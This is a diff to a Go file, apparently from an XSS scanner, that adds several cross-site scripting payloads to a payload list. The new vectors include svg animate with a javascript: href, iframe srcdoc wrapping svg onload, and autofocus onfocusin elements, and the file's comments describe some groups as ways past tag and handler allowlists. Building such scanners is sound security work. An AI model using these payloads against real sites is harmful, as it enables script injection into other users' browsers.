@@ -53,6 +53,8 @@ func htmlTextExecLadder() []xssExecPayload {
 		{`<marquee onstart=` + xssAlert + `>x</marquee>`, "marquee", "onstart"},
 		{`<object data="javascript:` + xssAlert + `">`, "object", "javascript:"},
 		{`<iframe srcdoc="&lt;script&gt;` + xssAlert + `&lt;/script&gt;">`, "iframe", "srcdoc"},
+		{`<iframe srcdoc="&lt;svg onload=` + xssAlert + `&gt;">`, "iframe", "srcdoc"},
+		{`<svg><set attributeName=x to=y onbegin=` + xssAlert + `>`, "set", "onbegin"},
 		// ── auto-focus vectors (fire without a mouse) ──
 		{`<input autofocus onfocus=` + xssAlert + `>`, "input", "onfocus"},
 		{`<select autofocus onfocus=` + xssAlert + `>`, "select", "onfocus"},
@@ -64,6 +66,8 @@ func htmlTextExecLadder() []xssExecPayload {
 		{`<iMg sRc=x oNerRor=` + xssAlert + `>`, "img", "onerror"},
 		{"<svg\tonload=" + xssAlert + ">", "svg", "onload"},
 		{"<svg\nonload=" + xssAlert + ">", "svg", "onload"},
+		{"<svg\fonload=" + xssAlert + ">", "svg", "onload"},
+		{`<svg><a><animate attributeName=href values=javascript:` + xssAlert + ` /><text x=20 y=20>click</text></a>`, "animate", "javascript:"},
 		{`<svg onload=` + xssAlert + `//`, "svg", "onload"},
 		// In an HTML document the tokenizer aliases the obsolete <image> spelling
 		// to a live <img> element. Correlate against the parsed name, not the source
@@ -72,6 +76,7 @@ func htmlTextExecLadder() []xssExecPayload {
 		// ── rare tags / rare events (bypass tag/handler allowlists) ──
 		{`<xss id=x tabindex=1 onfocusin=` + xssAlert + `></xss>`, "xss", "onfocusin"},
 		{`<div onpointerenter=` + xssAlert + `>x</div>`, "div", "onpointerenter"},
+		{`<div tabindex=1 autofocus onfocusin=` + xssAlert + `>x</div>`, "div", "onfocusin"},
 		{`<style onload=` + xssAlert + `></style>`, "style", "onload"},
 		{`<svg><set attributeName=x onbegin=` + xssAlert + `>`, "set", "onbegin"},
 		{`<form><button formaction=javascript:` + xssAlert + `>x`, "button", "formaction"},
